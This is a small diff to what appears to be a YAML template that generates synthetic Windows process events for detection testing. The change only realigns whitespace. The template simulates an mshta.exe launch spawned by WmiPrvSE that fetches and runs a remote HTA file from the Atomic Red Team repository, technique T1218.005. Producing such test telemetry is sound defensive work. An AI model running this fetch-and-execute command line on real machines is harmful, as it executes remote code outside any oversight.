@@ -33,11 +33,11 @@ state:
   username:            gen.username()
   user:                "${ref.domain_short}\\${ref.username}"
   event_record_id:     gen.int(min=5000, max=9999999)
-  url:                  "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/24549e3866407c3080b95b6afebf78e8acd23352/atomics/T1218.005/src/T1218.005.hta"
-  command_line:         "\"C:\\Windows\\system32\\mshta.exe\" \"${ref.url}\""
-  current_directory:    "C:\\Windows\\system32\\"
-  parent_image:         "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe"
-  parent_command_line:  "C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding"
+  url:                 "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/24549e3866407c3080b95b6afebf78e8acd23352/atomics/T1218.005/src/T1218.005.hta"
+  command_line:        "\"C:\\Windows\\system32\\mshta.exe\" \"${ref.url}\""
+  current_directory:   "C:\\Windows\\system32\\"
+  parent_image:        "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe"
+  parent_command_line: "C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding"
 
 steps:
   - emit:
